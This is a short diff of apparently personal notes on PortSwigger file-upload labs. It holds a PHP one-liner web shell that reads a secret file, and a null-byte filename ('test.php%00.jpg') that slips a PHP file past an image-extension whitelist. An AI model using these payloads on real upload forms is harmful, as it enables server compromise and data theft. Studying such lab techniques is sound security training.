@@ -8,5 +8,10 @@ https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-uploa
 
 3. Upload `test.133t` with content: `<?php echo file_get_contents('/home/carlos/secret'); ?>` to get the flag.
 
-# passs
+# Bypass whitelist extension with Null byte
 
+Upload avatar only allowed .png and .jpg
+
+PHP 5.3.4 < Vulnerable to null byte injection
+
+*file name*: `test.php%00.jpg`
